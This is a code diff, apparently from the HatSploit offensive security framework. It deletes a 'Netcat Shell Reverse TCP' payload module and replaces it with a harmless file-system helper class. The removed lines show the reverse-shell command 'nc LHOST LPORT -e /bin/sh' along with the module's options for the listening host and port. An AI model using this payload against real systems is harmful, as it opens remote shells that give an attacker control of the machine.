@@ -24,47 +24,36 @@
 # SOFTWARE.
 #
 
-from core.lib.payload import Payload
-from utils.tcp import TCPClient
+import os
+
+from core.cli.badges import Badges
 
 
-class HatSploitPayload(Payload, TCPClient):
-    details = {
-        'Category': "single",
-        'Name': "Netcat Shell Reverse TCP",
-        'Payload': "unix/generic/netcat_reverse_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080)'
-        ],
-        'Description': "Netcat shell reverse TCP payload.",
-        'Comments': [
-            ''
-        ],
-        'Architecture': "generic",
-        'Platform': "unix",
-        'Risk': "high",
-        'Type': "reverse_tcp"
-    }
+class FSTools:
+    badges = Badges()
 
-    options = {
-        'LHOST': {
-            'Description': "Local host.",
-            'Value': TCPClient.get_local_host(),
-            'Type': "ip",
-            'Required': True
-        },
-        'LPORT': {
-            'Description': "Local port.",
-            'Value': 8888,
-            'Type': "port",
-            'Required': True
-        }
-    }
+    def exists_directory(self, path):
+        if os.path.isdir(path):
+            if os.path.exists(path):
+                return True, "directory"
+            self.badges.output_error("Local directory: " + path + ": does not exist!")
+            return False, ""
+        directory = os.path.split(path)[0]
+        if directory == "":
+            directory = "."
+        if os.path.exists(directory):
+            if os.path.isdir(directory):
+                return True, "file"
+            self.badges.output_error("Error: " + directory + ": not a directory!")
+            return False, ""
+        self.badges.output_error("Local directory: " + directory + ": does not exist!")
+        return False, ""
 
-    def run(self):
-        local_host, local_port = self.parse_options(self.options)
-
-        self.output_process("Generating payload...")
-        payload = f"nc {local_host} {local_port} -e /bin/sh"
-
-        return payload
+    def file(self, path):
+        if os.path.exists(path):
+            if os.path.isdir(path):
+                self.badges.output_error("Error: " + path + ": not a file!")
+                return False
+            return True
+        self.badges.output_error("Local file: " + path + ": does not exist!")
+        return False
